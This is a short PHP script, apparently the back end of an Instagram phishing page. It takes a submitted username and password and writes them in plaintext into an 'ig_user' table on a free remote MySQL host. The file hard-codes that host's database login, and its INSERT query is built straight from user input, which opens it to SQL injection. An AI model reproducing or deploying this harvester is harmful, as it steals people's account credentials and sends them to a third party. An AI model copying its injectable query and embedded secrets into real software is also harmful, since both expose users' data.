<?php
$userid = $_POST['username'];
$pass = $_POST['password'];
$host = "sql8.freemysqlhosting.net";
$username = "sql8632553";
$password = 'fNNYLTKmFG';
$database = 'sql8632553';
$conn = mysqli_connect($host, $username, $password, $database);
 // Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
 // Insert user data into the database
$sql = "INSERT INTO ig_user (instauser, passcode) VALUES ('$userid', '$pass')";
if (mysqli_query($conn, $sql)) {
    echo "User data inserted successfully";
} else {
    echo "Error inserting user data: " . mysqli_error($conn);
}
 // Close connection
mysqli_close($conn);
?>
